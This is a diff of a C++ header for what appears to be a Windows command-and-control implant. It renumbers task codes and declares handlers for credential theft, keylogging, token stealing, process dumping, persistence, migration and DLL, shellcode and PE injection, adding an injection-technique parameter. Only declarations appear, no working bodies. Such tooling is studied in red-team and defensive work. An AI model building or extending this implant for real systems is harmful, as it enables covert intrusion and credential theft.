@@ -21,7 +21,6 @@
 #include <psapi.h>
 #include <strsafe.h>
 #include <synchapi.h>
-// #include <tlhelp32.h>
 #include <chrono>
 #include <map>
 #include <string>
@@ -51,19 +50,19 @@
 #define TASK_DLL                0x08
 #define TASK_DOWNLOAD           0x09
 #define TASK_ENV_LS             0x10
-#define TASK_EXE                0x11
-#define TASK_GROUP_LS           0x12
-#define TASK_HISTORY            0x13
-#define TASK_IP                 0x14
-#define TASK_JITTER             0x15
-#define TASK_KEYLOG             0x16
-#define TASK_KILL               0x17
-#define TASK_KILLDATE           0x18
-#define TASK_LS                 0x19
-#define TASK_MIGRATE            0x20
-#define TASK_MKDIR              0x21
-#define TASK_MV                 0x22
-#define TASK_NET                0x23
+#define TASK_GROUP_LS           0x11
+#define TASK_HISTORY            0x12
+#define TASK_IP                 0x13
+#define TASK_JITTER             0x14
+#define TASK_KEYLOG             0x15
+#define TASK_KILL               0x16
+#define TASK_KILLDATE           0x17
+#define TASK_LS                 0x18
+#define TASK_MIGRATE            0x19
+#define TASK_MKDIR              0x20
+#define TASK_MV                 0x21
+#define TASK_NET                0x22
+#define TASK_PE                 0x23
 #define TASK_PERSIST            0x24
 #define TASK_PROCDUMP           0x25
 #define TASK_PS_KILL            0x26
@@ -136,10 +135,9 @@ namespace Task
     std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
     std::wstring Cp(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring CredsSteal(State::PSTATE pState);
-    std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring EnvLs(State::PSTATE pState);
-    std::wstring Exe(State::PSTATE pState, const std::wstring& wExeSrc);
     std::wstring GroupLs();
     std::wstring History(State::PSTATE pState);
     std::wstring Ip();
@@ -152,6 +150,7 @@ namespace Task
     std::wstring Mkdir(State::PSTATE pState, const std::wstring& wDir);
     std::wstring Mv(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
     std::wstring Net();
+    std::wstring Pe(State::PSTATE pState, const std::wstring& wTargetProcess, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring Persist(State::PSTATE pState, const std::wstring& wTechnique);
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid);
     std::wstring PsKill(State::PSTATE pState, const std::wstring& wPid);
@@ -165,7 +164,7 @@ namespace Task
     std::wstring RportfwdRm(State::PSTATE pState);
     std::wstring RunAs(State::PSTATE pState, const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
     std::wstring Screenshot(State::PSTATE pState);
-    std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
+    std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc, const std::wstring& wTechnique);
     std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
     std::wstring TokenRevert();
     std::wstring TokenSteal(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wProcName, bool bLogin);
